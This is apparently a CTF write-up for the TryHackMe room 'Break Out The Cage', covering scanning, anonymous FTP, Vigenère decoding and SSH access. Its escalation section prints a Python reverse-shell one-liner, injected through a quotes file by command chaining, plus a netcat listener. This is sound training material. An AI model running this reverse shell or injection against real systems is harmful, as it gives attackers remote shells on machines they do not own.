# break out the cage
![BOTC](https://user-images.githubusercontent.com/80511498/147870792-2dee2d8b-3fea-4883-8884-3e4f66808154.png)
**Tryhackme break out the cage[easy]** 
https://tryhackme.com/room/breakoutthecage1
## NMAP SCAN 
___
```
 starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 14:09 IST
 Nmap scan report for 10.10.24.112
 Host is up (0.17s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
 |      Connected to ::ffff:10.17.33.72
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
 |      At session startup, client count was 3
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
 |   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
 |   256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-title: Nicholas Cage Stories
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 TCP/IP fingerprint:
 OS:SCAN(V=7.92%E=4%D=1/1%OT=21%CT=1%CU=32285%PV=Y%DS=5%DC=T%G=Y%TM=61D0137F
OS:%P=x86_64-pc-linux-gnu)......

 Network Distance: 5 hops
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

 TRACEROUTE (using port 199/tcp)
 HOP RTT       ADDRESS
 1   23.35 ms  10.17.0.1
 2   ... 4
 5   192.15 ms 10.10.24.112

 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.86 seconds
 ```
we can clearly see that 3 ports are open 

|service|port-no|
|---|---|
|ftp|port 21|
|ssh|port 22|
|http|port 80|

 
 
 ## dirserach Scan
 ```
  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /root/.dirsearch/reports/10.10.24.112/_22-01-01_14-11-05.txt

Error Log: /root/.dirsearch/logs/errors-22-01-01_14-11-05.log

Target: http://10.10.24.112/

[14:11:06] Starting: 
[14:11:08] 301 -  311B  - /html  ->  http://10.10.24.112/html/
[14:11:13] 403 -  277B  - /.ht_wsr.txt
[14:11:13] 403 -  277B  - /.htaccessBAK
[14:11:13] 403 -  277B  - /.htaccess.orig
[14:11:13] 403 -  277B  - /.htaccess.save
[14:11:13] 403 -  277B  - /.htaccessOLD
[14:11:13] 403 -  277B  - /.htaccess_sc
[14:11:13] 403 -  277B  - /.htaccess_extra
[14:11:13] 403 -  277B  - /.htaccess_orig
[14:11:13] 403 -  277B  - /.htaccess.sample
[14:11:13] 403 -  277B  - /.htm
[14:11:13] 403 -  277B  - /.htaccessOLD2
[14:11:13] 403 -  277B  - /.html
[14:11:13] 403 -  277B  - /.htpasswds
[14:11:13] 403 -  277B  - /.httr-oauth
[14:11:13] 403 -  277B  - /.htaccess.bak1
[14:11:13] 403 -  277B  - /.htpasswd_test
[14:12:08] 200 -  737B  - /html/
[14:12:09] 301 -  313B  - /images  ->  http://10.10.24.112/images/
[14:12:09] 200 -    4KB - /images/
[14:12:10] 200 -    2KB - /index.html
[14:12:33] 301 -  314B  - /scripts  ->  http://10.10.24.112/scripts/
[14:12:33] 200 -    2KB - /scripts/
[14:12:33] 200 -    2KB - /auditions/
[14:12:33] 403 -  277B  - /server-status
[14:12:34] 403 -  277B  - /server-status/

Task Completed
```
i did a directory search and found few page's

so i looked at every page carefully and found nothing on /html, script and images
but i found something on /auditions page an audio , i will check it later
 ![Screenshot (74)](https://user-images.githubusercontent.com/80511498/147870967-adab6879-559b-4b3e-986d-1f286df4189e.png)


## FTP 
```
$ftp 10.10.186.32
Connected to 10.10.186.32.
220 (vsFTPd 3.0.3)
Name (10.10.186.32:root): Anonymous            
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.00 secs (2.0195 MB/s)
ftp> 
``` 
  so we got a file named dad_tasks
  ```
  # file dad_tasks 
    dad_tasks: ASCII text, with very long lines (396), with no line
	terminators
  ```
  so its ASCII text so it must be base encoding maybe base64 
  and yes it is and look what i found
  ```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
  ```
  and it looks like a  ceaser's cipher ummmmmm!!! but no its not 
  it is similer but uses vigenere cipher  
 - have two solution for that 
 - first find the key which is basiclly required to crack the cipher
   which you can basiclly find in the audio file is using spectrogram
 - use the following link to see the crack the audio cipher 
   - https://academo.org/demos/spectrum-analyzer/
    ![Screenshot (76)](https://user-images.githubusercontent.com/80511498/147871004-aab24a08-8437-4f92-bbf5-7801b1682fa6.png)

 - another link which will directly crack the cipher and will not need key to crack the cipher
https:www.guballa.de/vigenere-solver

** you will get the password for weston **
and the first answer 

# ssh

![Screenshot (78)](https://user-images.githubusercontent.com/80511498/147871037-2cf09c8b-1acd-433c-b138-c29e3502f3aa.png)


i looked around and found something

![Screenshot (86)](https://user-images.githubusercontent.com/80511498/147871688-b12f8f11-cb2a-4463-8957-7ce0f48d362f.png)

and its a bash file and is of no use to us ,so i tried searching again and looked around some files
and got something in opt 

![Screenshot (84)](https://user-images.githubusercontent.com/80511498/147871979-f8a3929b-cb51-418a-b1ac-c4f95ee81478.png)

lets see the spread_the_quotes.py

![Screenshot (85)](https://user-images.githubusercontent.com/80511498/147872047-468b3040-0a88-4017-ac23-e43aef25bb0d.png)

the quotes file can be used to put reverse shell
and we put in "hello" and && it bascily test line if hello print then it must be working 

```
"hello" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
now use netcat to listen to the port 
```
nc -lvnp 4242
```
and we got in 

```
 ┌──(kali㉿MSI)-[~]
└─$ nc -lvnp 4444 
Listening on 0.0.0.0 4444
Connection received on 10.10.149.48 43656
cage@national-treasure:~$ ls
ls
email_backup  Super_Duper_Checklist
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{user flag here}
cage@national-treasure:~$ 
```
now you can look into the email files you will find again find a vigenere cipher just crack it and you will get the root access
and you can find the root flag in /root/email_backup
```
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{root flag here}

Thank you

Sean Archer
```
 
 
		
